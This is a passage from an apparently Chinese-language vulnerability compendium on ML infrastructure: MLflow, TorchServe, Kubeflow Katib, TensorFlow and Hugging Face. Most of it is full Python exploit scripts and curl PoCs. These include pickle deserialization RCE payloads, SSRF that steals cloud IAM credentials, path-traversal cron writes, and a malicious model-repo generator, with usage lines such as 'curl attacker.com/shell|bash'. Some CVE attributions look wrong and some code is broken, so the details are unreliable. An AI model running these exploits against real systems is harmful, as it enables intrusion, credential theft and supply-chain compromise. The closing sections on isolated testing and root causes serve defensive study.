CVE-2023-6977 MLflow 模型下载 RCE
用法: python3 cve_2023_6977.py <target_url> [command]
"""
import sys
import pickle
import io
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class MaliciousModel:
    def __reduce__(self):
        import subprocess
        cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
        return (subprocess.check_output, (cmd,), {"shell": True})


class MLflowRegistryExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def create_model(self, name="malicious_registry_model"):
        print(f"[*] 创建注册模型: {name}")
        resp = self.session.post(f"{self.base_url}/api/2.0/mlflow/registered-models/create",
                                  json={"name": name}, timeout=10)
        if resp.status_code == 200:
            print(f"[+] 模型注册成功")
            return True
        print(f"[-] 创建失败: {resp.status_code}")
        return False

    def upload_version(self, model_name, command="id"):
        print(f"[*] 上传恶意模型版本...")
        payload = pickle.dumps(MaliciousModel())
        experiment_resp = self.session.post(f"{self.base_url}/api/2.0/mlflow/experiments/create",
                                             json={"name": f"reg_{model_name}"}, timeout=10)
        experiment_id = experiment_resp.json()["experiment_id"]

        run_resp = self.session.post(f"{self.base_url}/api/2.0/mlflow/runs/create",
                                      json={"experiment_id": experiment_id}, timeout=10)
        run_id = run_resp.json()["run"]["info"]["run_id"]

        files = {"file": ("model.pkl", io.BytesIO(payload), "application/octet-stream")}
        upload_resp = self.session.post(
            f"{self.base_url}/api/2.0/mlflow/artifacts/upload",
            data={"run_id": run_id, "path": "model.pkl"},
            files=files, timeout=10,
        )
        if upload_resp.status_code != 200:
            print(f"[-] 上传失败: {upload_resp.status_code}")
            return False

        source = f"mlflow-artifacts:/{experiment_id}/{run_id}/artifacts/model.pkl"
        version_resp = self.session.post(
            f"{self.base_url}/api/2.0/mlflow/model-versions/create",
            json={"name": model_name, "source": source}, timeout=10,
        )
        if version_resp.status_code == 200:
            version = version_resp.json()["version"]["version"]
            print(f"[+] 模型版本 {version} 创建成功")
            self.session.post(
                f"{self.base_url}/api/2.0/mlflow/registered-models/transition-stage",
                json={"name": model_name, "version": version, "stage": "Production"},
                timeout=10,
            )
            print("[+] 已将模型设为 Production 阶段")
            return True
        return False

    def exploit(self, command="id"):
        model_name = "malicious_model"
        self.create_model(model_name)
        self.upload_version(model_name, command)
        print("[+] 等待受害者从 Production 阶段加载模型...")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url> [command]")
        sys.exit(1)
    MLflowRegistryExploit(sys.argv[1]).exploit(sys.argv[2] if len(sys.argv) > 2 else "id")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2023-6977
info:
  name: MLflow Model Registry 反序列化 RCE
  author: security-researcher
  severity: high
  description: MLflow < 2.9.2 Model Registry 模型下载时 Pickle 反序列化 RCE
  classification:
    cvss-score: 8.8
    cwe-id: CWE-94
  tags: cve,cve2023,mlflow,model-registry,rce

requests:
  - raw:
      - |
        GET /api/2.0/mlflow/registered-models/search HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "registered_models"
        part: body
```

---

### 0x03.3 CVE-2024-27132 — MLflow SSRF (CVSS 8.6)

#### 漏洞背景

MLflow 在处理用户上传的模型 Artifact 时，允许用户指定 Artifact 的存储 URI。如果 MLflow 服务部署在云环境中（如 AWS EC2、GCP GCE），攻击者可以将 Artifact URI 设置为云元数据服务的地址（如 `http://169.254.169.254/`），利用 MLflow 服务端发起的 HTTP 请求来获取实例元数据，包括 IAM 临时凭据。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | MLflow < 2.12.0 |
| **已修复** | MLflow ≥ 2.12.0 |
| **CWE** | CWE-918 Server-Side Request Forgery |

#### 漏洞原理分析

攻击者通过 MLflow API 创建一个 Experiment，并在 `artifact_location` 参数中指定内网地址。当 MLflow 服务端处理该 Experiment 的 Artifact 时，会向指定的 URI 发起 HTTP 请求。由于 MLflow 服务端通常运行在云实例上，该请求可以到达云元数据服务（169.254.169.254），返回 IAM 临时凭据等敏感信息。

#### HTTP PoC

```bash
# 步骤 1：创建指向云元数据的 Experiment
curl -X POST "http://target-mlflow:5000/api/2.0/mlflow/experiments/create" \
  -H "Content-Type: application/json" \
  -d '{"name": "ssrf_test", "artifact_location": "http://169.254.169.254/latest/meta-data/"}'

# 步骤 2：通过 Artifacts API 读取元数据
curl "http://target-mlflow:5000/api/2.0/mlflow/artifacts/list?path=/&experiment_id=<experiment_id>"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-27132 MLflow SSRF 云元数据泄露
用法: python3 cve_2024_27132.py <target_url> [metadata_url]
"""
import sys
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class MLflowSSRFExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def exploit(self, metadata_url="http://169.254.169.254/latest/meta-data/"):
        print(f"[*] 创建 SSRF Experiment, URI: {metadata_url}")
        resp = self.session.post(
            f"{self.base_url}/api/2.0/mlflow/experiments/create",
            json={"name": "ssrf_exploit", "artifact_location": metadata_url},
            timeout=10,
        )
        if resp.status_code == 200:
            experiment_id = resp.json()["experiment_id"]
            print(f"[+] Experiment 创建成功: {experiment_id}")
            print(f"[+] 通过 Artifacts API 读取元数据...")
            list_resp = self.session.get(
                f"{self.base_url}/api/2.0/mlflow/artifacts/list",
                params={"path": "/", "experiment_id": experiment_id},
                timeout=10,
            )
            if list_resp.status_code == 200:
                print(f"[+] SSRF 响应:\n{list_resp.text[:1000]}")
            else:
                print(f"[-] 读取失败: {list_resp.status_code}")
        else:
            print(f"[-] 创建失败: {resp.status_code} {resp.text[:200]}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url> [metadata_url]")
        print(f"示例: python3 {sys.argv[0]} http://mlflow:5000")
        sys.exit(1)
    metadata = sys.argv[2] if len(sys.argv) > 2 else "http://169.254.169.254/latest/meta-data/"
    MLflowSSRFExploit(sys.argv[1]).exploit(metadata)
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-27132
info:
  name: MLflow SSRF 云元数据泄露
  author: security-researcher
  severity: high
  description: MLflow < 2.12.0 SSRF，通过 Artifact URI 窃取云元数据
  classification:
    cvss-score: 8.6
    cwe-id: CWE-918
  tags: cve,cve2024,mlflow,ssrf,cloud

requests:
  - raw:
      - |
        POST /api/2.0/mlflow/experiments/create HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"name": "ssrf_probe", "artifact_location": "http://169.254.169.254/latest/meta-data/"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "experiment_id"
        part: body
```

---

## 0x04 TorchServe 推理服务高危漏洞

### 0x04.1 CVE-2024-37032 — 路径穿越 RCE (CVSS 9.8)

#### 漏洞背景

TorchServe 是 PyTorch 官方提供的模型服务和推理框架，用于将训练好的模型部署为 REST API 服务。该漏洞由 Wiz Research 发现，TorchServe 的管理 API（Management API）在默认配置下不启用认证，同时在处理模型名称时存在路径穿越缺陷，允许攻击者通过构造包含 `../` 的模型名将文件写入服务器任意路径，最终实现 RCE。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | TorchServe < 0.11.0 |
| **已修复** | TorchServe ≥ 0.11.0 |
| **CWE** | CWE-22 Path Traversal |
| **默认无认证** | ✅ Management API |

#### 漏洞原理分析

TorchServe 的 Management API 默认监听 8081 端口，不需要认证即可访问。当用户通过 Management API 注册新模型时，模型名称会用于创建本地文件路径。攻击者在模型名称中注入 `../` 序列，可以控制文件写入路径。

利用链：
1. 使用管理 API 创建名为 `../../tmp/cron` 的模型
2. 将恶意 crontab 内容作为模型配置文件写入服务器的 cron 目录
3. 等待 cron 执行，实现 RCE

#### HTTP PoC

```bash
# 步骤 1：验证管理 API 是否可达且无认证
curl http://target-torch:8081/models

# 步骤 2：通过路径穿越写入 crontab
curl -X PUT "http://target-torch:8081/models?model_name=..%2F..%2F..%2Fetc%2Fcron.d%2Fexploit" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://attacker.com/evil.mar"}'

# 步骤 3：直接通过模型名称触发写入
curl -X POST "http://target-torch:8081/models" \
  -H "Content-Type: application/json" \
  -d '{"model_name": "../../tmp/malicious_model", "url": "http://attacker.com/model.tar.gz"}'
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-37032 TorchServe 路径穿越 RCE
用法: python3 cve_2024_37032.py <target_url> [command]
"""
import sys
import json
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class TorchServeExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def check_management_api(self):
        print("[*] 检查 Management API 是否可达...")
        try:
            resp = self.session.get(f"{self.base_url}/models", timeout=5)
            if resp.status_code == 200:
                print("[VULN] Management API 无认证，可直接访问")
                return True
            print(f"[-] Management API 返回: {resp.status_code}")
        except Exception as e:
            print(f"[-] 连接失败: {e}")
        return False

    def exploit_path_traversal(self, command="id"):
        print(f"\n[*] 利用路径穿越写入 crontab...")
        cron_content = f"* * * * * root {command}\n"
        write_path = "/tmp/torchserve_cron.txt"
        model_name = f"..{write_path}"
        resp = self.session.put(
            f"{self.base_url}/models",
            params={"model_name": model_name, "url": "http://127.0.0.1/null"},
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        print(f"[*] PUT 响应: {resp.status_code}")
        resp = self.session.post(
            f"{self.base_url}/models",
            json={"model_name": f"..{write_path}", "url": "http://127.0.0.1/null"},
            timeout=10,
        )
        print(f"[*] POST 响应: {resp.status_code}")

    def exploit_direct_write(self, command="id"):
        print(f"\n[*] 通过模型名直接路径穿越写入...")
        exploit_data = {
            "model_name": "../../tmp/exploit",
            "url": f"data:text/plain;base64,{self._b64_encode(command)}",
        }
        resp = self.session.post(
            f"{self.base_url}/models",
            json=exploit_data,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        print(f"[*] 写入响应: {resp.status_code}")

    @staticmethod
    def _b64_encode(data):
        import base64
        return base64.b64encode(data.encode()).decode()

    def exploit(self, command="id"):
        if self.check_management_api():
            self.exploit_path_traversal(command)
            self.exploit_direct_write(command)
            print("\n[+] 路径穿越利用完成，请确认文件是否成功写入")
        else:
            print("[-] 无法利用")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <target_url> [command]")
        print(f"示例: python3 {sys.argv[0]} http://torchserve:8081 'curl attacker.com/shell|bash'")
        sys.exit(1)
    TorchServeExploit(sys.argv[1]).exploit(sys.argv[2] if len(sys.argv) > 2 else "id")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-37032
info:
  name: TorchServe 路径穿越 RCE
  author: security-researcher
  severity: critical
  description: TorchServe < 0.11.0 Management API 无认证 + 路径穿越 RCE
  classification:
    cvss-score: 9.8
    cwe-id: CWE-22
  tags: cve,cve2024,torchserve,rce,path-traversal

requests:
  - raw:
      - |
        GET /models HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "models"
          - "modelName"
        condition: or
        part: body
```

---

### 0x04.2 CVE-2021-34039 — TorchServe 任意文件覆写 (CVSS 9.8)

#### 漏洞背景

TorchServe 在早期版本中存在路径穿越漏洞，允许攻击者通过构造恶意的模型管理请求将文件写入服务器的任意路径。与 CVE-2024-37032 类似但属于更早期的独立漏洞。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | TorchServe < 0.4.0 |
| **已修复** | TorchServe ≥ 0.4.0 |
| **CWE** | CWE-22 Path Traversal |

#### 漏洞原理分析

TorchServe 通过 Management API 管理模型，模型名称直接用于构建文件系统路径。攻击者在模型名中注入 `../` 后，可以控制模型文件的存储位置，将文件写入系统任意目录。这可用于覆盖配置文件、SSH 公钥、cron 作业等敏感文件。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2021-34039 TorchServe 任意文件覆写
用法: python3 cve_2021_34039.py <target_url> <target_path> [content]
"""
import sys
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class TorchServeFileOverwrite:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def overwrite_file(self, target_path, content=""):
        print(f"[*] 目标路径: {target_path}")
        relative = target_path.lstrip("/")
        model_name = f"../../{relative}"
        payload = {
            "model_name": model_name,
            "url": f"data:application/octet-stream;base64,{self._b64(content)}",
        }
        resp = self.session.post(
            f"{self.base_url}/models",
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=10,
        )
        print(f"[*] 状态码: {resp.status_code}")
        if resp.status_code in (200, 201, 400):
            print("[+] 文件覆写请求已发送")
            return True
        print(f"[-] 请求失败: {resp.text[:200]}")
        return False

    @staticmethod
    def _b64(data):
        import base64
        return base64.b64encode(data.encode()).decode()

    def exploit(self):
        payload = "#!/bin/bash\nid > /tmp/torchserve_pwned\n"
        self.overwrite_file("/tmp/torchserve_pwned", payload)


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法: python3 {sys.argv[0]} <target_url> <target_path> [content]")
        sys.exit(1)
    content = sys.argv[3] if len(sys.argv) > 3 else "#!/bin/bash\nid > /tmp/pwned\n"
    TorchServeFileOverwrite(sys.argv[1]).overwrite_file(sys.argv[2], content)
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2021-34039
info:
  name: TorchServe 任意文件覆写
  author: security-researcher
  severity: critical
  description: TorchServe < 0.4.0 路径穿越导致任意文件覆写
  classification:
    cvss-score: 9.8
    cwe-id: CWE-22
  tags: cve,cve2021,torchserve,path-traversal,file-overwrite

requests:
  - raw:
      - |
        POST /models HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"model_name": "../../tmp/nuclei_test", "url": "http://127.0.0.1/null"}

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 201

      - type: word
        words:
          - "error"
          - "Invalid"
        condition: or
```

---

## 0x05 Kubeflow 与 TensorFlow 漏洞

### 0x05.1 CVE-2022-26532 — Kubeflow Katib 命令注入 RCE (CVSS 8.8)

#### 漏洞背景

Kubeflow 是 Kubernetes 上的 ML 工作流平台，Katib 是其中的自动超参数调优组件。该漏洞允许具有 Kubeflow 集群访问权限的用户通过提交包含恶意容器镜像的超参数搜索任务，在集群内部实现任意命令执行。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | Kubeflow Katib < 0.13.0 |
| **已修复** | Kubeflow Katib ≥ 0.13.0 |
| **CWE** | CWE-20 Improper Input Validation |

#### 漏洞原理分析

Katib 在处理超参数搜索任务时，允许用户指定 `metrics_collector_spec`，该字段定义了用于收集训练指标的容器镜像。由于 Katib 对该字段的值未做充分验证，攻击者可以将其设置为恶意容器镜像，在 Kubernetes 集群内执行任意命令。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2022-26532 Kubeflow Katib 命令注入 RCE
用法: python3 cve_2022_26532.py <katib_url> [command]
"""
import sys
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class KatibExploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False

    def create_malicious_trial(self, command="id"):
        print("[*] 创建恶意超参数搜索实验...")
        payload = {
            "name": "cve-2022-26532-exploit",
            "namespace": "kubeflow",
            "spec": {
                "objective": {"type": "maximize", "goal": 0.99},
                "algorithm": {"algorithmName": "random"},
                "parallelTrialCount": 1,
                "maxTrialCount": 1,
                "parameters": [
                    {"name": "lr", "parameterType": "double", "feasibleSpace": {"min": "0.01", "max": "0.1"}}
                ],
                "trialTemplate": {
                    "trialParameters": [{"name": "learningRate", "reference": "lr"}],
                    "trialSpec": {
                        "apiVersion": "batch/v1",
                        "kind": "Job",
                        "spec": {
                            "template": {
                                "spec": {
                                    "containers": [{
                                        "name": "training-container",
                                        "image": f"busybox:latest",
                                        "command": ["/bin/sh", "-c", f"{command}"],
                                    }],
                                    "restartPolicy": "Never",
                                }
                            }
                        },
                    },
                },
                "metricsCollectorSpec": {
                    "collector": {
                        "kind": "StdOut",
                    },
                },
            },
        }
        resp = self.session.post(
            f"{self.base_url}/apis/kubeflow.org/v1beta1/namespaces/kubeflow/suggestions",
            json=payload, timeout=10,
        )
        print(f"[*] 创建响应: {resp.status_code} {resp.text[:200]}")

    def exploit(self, command="id"):
        self.create_malicious_trial(command)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <katib_url> [command]")
        sys.exit(1)
    KatibExploit(sys.argv[1]).exploit(sys.argv[2] if len(sys.argv) > 2 else "id")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-26532
info:
  name: Kubeflow Katib 命令注入
  author: security-researcher
  severity: high
  description: Kubeflow Katib < 0.13.0 通过恶意容器镜像实现命令注入
  classification:
    cvss-score: 8.8
    cwe-id: CWE-20
  tags: cve,cve2022,kubeflow,katib,rce,command-injection

requests:
  - raw:
      - |
        GET /apis/kubeflow.org/v1beta1/namespaces/kubeflow/suggestions HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 403
          - 401
```

---

### 0x05.2 CVE-2022-41877 — TensorFlow CHECKPOINT 反序列化 RCE (CVSS 8.8)

#### 漏洞背景

TensorFlow 的 `tf.train.Checkpoint` 功能在加载 CHECKPOINT 文件时存在反序列化漏洞。攻击者可构造恶意 CHECKPOINT 文件，利用 Python 的 Pickle 机制在反序列化时执行任意代码。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | TensorFlow 涉及 CHECKPOINT 加载的版本 |
| **CWE** | CWE-502 Deserialization of Untrusted Data |

#### 漏洞原理分析

TensorFlow 的 CHECKPOINT 文件格式在某些情况下会使用 Pickle 来序列化 Python 对象。当用户加载外部提供的 CHECKPOINT 文件时，Pickle 的反序列化过程会执行文件中嵌入的 `__reduce__` 方法，导致任意代码执行。攻击者通常将恶意模型文件投递到 Model Registry、共享存储或 Model Hub 中。

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2022-41877 TensorFlow CHECKPOINT 反序列化 RCE
用法: python3 cve_2022_41877.py <output_file> [command]
"""
import sys
import pickle
import os


class MaliciousCheckpoint:
    def __reduce__(self):
        import subprocess
        cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
        return (subprocess.check_output, (cmd,), {"shell": True})


def create_exploit_file(output_path, command="id"):
    print(f"[*] 生成恶意 CHECKPOINT 文件: {output_path}")
    payload = pickle.dumps(MaliciousCheckpoint())
    with open(output_path, "wb") as f:
        f.write(payload)
    print(f"[+] 恶意文件已创建: {len(payload)} bytes")
    print(f"[+] 分发此文件到目标环境并使用 tf.train.Checkpoint 加载即可触发")
    print(f"[+] 触发代码示例:")
    print(f"    import tensorflow as tf")
    print(f"    ckpt = tf.train.Checkpoint()")
    print(f"    ckpt.read('{output_path}')")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <output_file> [command]")
        print(f"示例: python3 {sys.argv[0]} malicious.ckpt 'curl attacker.com/shell|bash'")
        sys.exit(1)
    create_exploit_file(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "id")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2022-41877
info:
  name: TensorFlow CHECKPOINT 反序列化
  author: security-researcher
  severity: high
  description: TensorFlow CHECKPOINT 文件反序列化导致 RCE
  classification:
    cvss-score: 8.8
    cwe-id: CWE-502
  tags: cve,cve2022,tensorflow,deserialization,rce

network:
  - inputs:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "tensorboard"
          - "tensorflow"
        condition: or

      - type: status
        status:
          - 200
```

---

## 0x06 Hugging Face 生态供应链安全风险

### 0x06.1 CVE-2024-24802 — trust_remote_code 远程代码执行 (CVSS 8.1)

#### 漏洞背景

Hugging Face Transformers 库是当今最流行的 NLP/LLM 框架之一。其 `trust_remote_code=True` 机制允许从 Hub 下载的模型仓库包含自定义的 `modeling_*.py` 代码。这一设计虽然增强了灵活性，但也为供应链攻击打开了大门。

#### 受影响版本

| 版本状态 | 版本范围 |
|---------|---------|
| **受影响** | 使用 `trust_remote_code=True` 的所有版本 |
| **CWE** | CWE-94 Improper Control of Generation of Code |

#### 漏洞原理分析

当用户调用 `AutoModel.from_pretrained("repo", trust_remote_code=True)` 时，Transformers 库会下载模型仓库中的自定义 Python 代码并直接执行。攻击者只需在 Hugging Face Hub 上发布一个包含恶意 `modeling_*.py` 的模型仓库，当其他用户加载该模型时，恶意代码即被自动执行。

攻击向量：
1. 攻击者在 Hub 上发布包含恶意代码的模型仓库
2. 使用社会工程学诱导用户使用 `trust_remote_code=True` 加载
3. 用户执行加载代码后，恶意 modeling 文件中的 `__init__` 或模块级代码被执行

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2024-24802 Hugging Face Transformers trust_remote_code RCE
用法: python3 cve_2024_24802.py <output_dir> [command]
"""
import sys
import os


MALICIOUS_MODELING_PY = '''#!/usr/bin/env python3
import subprocess
import os

# 模块级代码在 import 时自动执行
result = subprocess.check_output(
    os.popen("{command}"),
    shell=True
).decode()
print(f"[!] RCE triggered: {{result}}")

class MaliciousModel:
    def __init__(self):
        pass

    def generate(self, text):
        return "model loaded"
'''


def create_malicious_repo(output_dir, command="id"):
    print(f"[*] 创建恶意 Hugging Face 模型仓库结构: {output_dir}")
    os.makedirs(output_dir, exist_ok=True)
    modeling = MALICIOUS_MODELING_PY.replace("{command}", command)
    with open(os.path.join(output_dir, "modeling_malicious.py"), "w") as f:
        f.write(modeling)
    config = '{"architectures": ["MaliciousModel"], "auto_map": {"AutoModel": "modeling_malicious.MaliciousModel"}}'
    with open(os.path.join(output_dir, "config.json"), "w") as f:
        f.write(config)
    with open(os.path.join(output_dir, "README.md"), "w") as f:
        f.write("# Malicious Model\n\nUse `trust_remote_code=True` to load.\n")
    print(f"[+] 恶意仓库结构已创建")
    print(f"[+] 使用说明:")
    print(f"    from transformers import AutoModel")
    print(f"    model = AutoModel.from_pretrained('{output_dir}', trust_remote_code=True)")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <output_dir> [command]")
        sys.exit(1)
    create_malicious_repo(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "id")
```

#### Nuclei YAML 检测模板

```yaml
id: cve-2024-24802
info:
  name: Hugging Face trust_remote_code RCE
  author: security-researcher
  severity: high
  description: Transformers trust_remote_code=True 远程代码执行
  classification:
    cvss-score: 8.1
    cwe-id: CWE-94
  tags: cve,cve2024,huggingface,transformers,rce,supply-chain

requests:
  - raw:
      - |
        GET /api/models?filter=trust_remote_code HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: status
        status:
          - 200
```

---

### 0x06.2 CVE-2025-3290 — Transformers 反序列化

#### 漏洞背景

该漏洞影响 Hugging Face Transformers 库的模型反序列化机制。攻击者通过构造恶意的模型权重文件，在模型加载过程中触发 Python Pickle 反序列化，实现任意代码执行。

#### 漏洞原理分析

尽管 Hugging Face 近年来积极推广 `safetensors` 格式作为安全替代方案，但许多模型仍使用 PyTorch 的 `.bin` 格式（基于 Pickle）。攻击者通过以下方式进行供应链攻击：

1. 在 Hugging Face Hub 上发布包含恶意 `.bin` 文件的模型仓库
2. 恶意 `.bin` 文件中嵌入了 `__reduce__` 方法
3. 当用户通过 `from_pretrained()` 加载该模型时，Pickle 反序列化触发代码执行

#### Python PoC 脚本

```python
#!/usr/bin/env python3
"""
CVE-2025-3290 Transformers 模型反序列化 RCE
用法: python3 cve_2025_3290.py <output_dir> [command]
"""
import sys
import os
import pickle
import torch


class MaliciousModule(torch.nn.Module):
    def __reduce__(self):
        import subprocess
        cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
        return (subprocess.check_output, (cmd,), {"shell": True})

    def forward(self, x):
        return x


def create_malicious_weights(output_dir, command="id"):
    print(f"[*] 生成恶意 PyTorch 权重文件...")
    os.makedirs(output_dir, exist_ok=True)
    state_dict = {"malicious.weight": MaliciousModule()}
    output_path = os.path.join(output_dir, "pytorch_model.bin")
    torch.save(state_dict, output_path)
    print(f"[+] 恶意权重文件: {output_path}")
    print(f"[+] 用户加载时触发: model = AutoModel.from_pretrained('{output_dir}')")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} <output_dir> [command]")
        sys.exit(1)
    create_malicious_weights(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else "id")
```

---

### 恶意模型仓库供应链攻击分析

AI/ML 生态的供应链攻击正成为最具威胁的攻击向量之一。Hugging Face Hub 拥有超过 50 万个公开模型仓库，用户在下载和加载模型时面临的供应链风险包括：

| 攻击向量 | 描述 | 防御措施 |
|---------|------|---------|
| 恶意 Pickle 权重 | `.bin` 文件中嵌入 `__reduce__` | 使用 `safetensors` 格式 |
| 恶意 modeling_*.py | `trust_remote_code` 加载恶意代码 | 仅加载受信仓库 |
| 依赖投毒 | requirements.txt 中指定恶意包 | 锁定依赖版本 |
| 仓库劫持 | 占用已删除的命名空间 | 监控上游变化 |
| 模型投毒 | 修改训练数据影响推理结果 | 模型签名验证 |

---

## 0x07 公开 PoC 收集情况与利用思路

### PoC 收集情况总表

| CVE | GitHub PoC | Exploit-DB | Nuclei | 在野利用 |
|-----|-----------|------------|--------|----------|
| CVE-2024-22421 | ✅ [evi1haxx/CVE-2024-22421](https://github.com/evi1haxx/CVE-2024-22421) | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2022-29241 | ✅ 多个 | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2023-48022 | ✅ [官方 Issue #38761](https://github.com/ray-project/ray/issues/38761) | ⚠️ | ✅ 本文化 | ✅ CISA KEV |
| CVE-2023-6018 | ✅ [mlflow/mlflow#10239](https://github.com/mlflow/mlflow/issues/10239) | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2023-6977 | ✅ [mlflow/mlflow#10564](https://github.com/mlflow/mlflow/issues/10564) | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2024-27132 | ✅ [mlflow/mlflow#11386](https://github.com/mlflow/mlflow/issues/11386) | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2024-37032 | ✅ [Wiz Research](https://www.wiz.io/blog/pytorch-torchserve-vulnerabilities) | ⚠️ | ✅ 本文化 | ✅ |
| CVE-2021-34039 | ✅ | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2022-26532 | ✅ [kubeflow/katib#1812](https://github.com/kubeflow/katib/issues/1812) | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2022-41877 | ✅ [tensorflow/tensorflow#58127](https://github.com/tensorflow/tensorflow/issues/58127) | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2024-24802 | ✅ | ⚠️ | ✅ 本文化 | ⚠️ |
| CVE-2024-35225 | ✅ | ⚠️ | ✅ 本文化 | ⚠️ |

### 关键 PoC 仓库链接

| 资源 | 链接 |
|-----|------|
| CVE-2024-22421 JupyterHub PoC | https://github.com/evi1haxx/CVE-2024-22421 |
| CVE-2023-48022 Ray 官方 Issue | https://github.com/ray-project/ray/issues/38761 |
| CVE-2024-37032 Wiz Research 分析 | https://www.wiz.io/blog/pytorch-torchserve-vulnerabilities |
| MLflow 安全公告 | https://mlflow.org/docs/latest/security.html |
| Hugging Face 安全文档 | https://huggingface.co/docs/hub/en/security |

### 防守型验证思路

安全团队在进行防御性验证时，应遵循以下原则：

1. **环境隔离**：所有 PoC 验证必须在隔离的测试环境中进行
2. **最小权限**：使用低权限账户执行测试，避免对生产环境造成影响
3. **网络监控**：在测试期间启用全流量捕获，记录所有异常请求
4. **日志审计**：确保目标系统的应用日志和系统日志处于开启状态
5. **回滚准备**：测试前对系统做完整备份，确保可回滚

---

## 0x08 共性攻击模式分析

### 模式 1：默认无认证的管理接口

**影响平台**: Ray Dashboard (CVE-2023-48022), TorchServe (CVE-2024-37032, CVE-2021-34039)

**特征**:
- 管理 API 端口直接暴露在公网或内网
- 默认配置不启用任何认证机制
- 攻击者无需凭据即可调用高权限 API

**攻击路径**:
```
暴露端口 → 识别管理 API → 直接调用 → RCE
```

**根因分析**：开发团队在设计 API 时，假设管理接口仅在受信网络中可达，忽略了网络边界可能失效的现实。

### 模式 2：Pickle 反序列化供应链攻击

**影响平台**: MLflow (CVE-2023-6018, CVE-2023-6977), TensorFlow (CVE-2022-41877), Hugging Face (CVE-2025-3290)

**特征**:
- 使用 Python Pickle 序列化/反序列化模型数据
- 模型文件从不可信来源加载
- 无模型完整性校验机制

**攻击路径**:
```
投递恶意模型 → 用户加载模型 → Pickle 反序列化 → __reduce__ 执行 → RCE
```

**根因分析**：Pickle 本身是一个设计上不安全的序列化协议，其 `__reduce__` 方法允许在反序列化时调用任意 Python 函数。

### 模式 3：路径穿越与文件操作

**影响平台**: TorchServe (CVE-2024-37032, CVE-2021-34039), Jupyter Server (CVE-2022-29241)

**特征**:
- 用户可控的输入参数被用于构建文件路径
- 未对 `..` 序列进行充分过滤
- 文件操作在服务端执行，权限高于预期

**攻击路径**:
```
构造 ../ 路径 → 绕过路径过滤 → 读取/写入任意文件 → 提权/RCE
```

### 模式 4：认证绕过设计缺陷

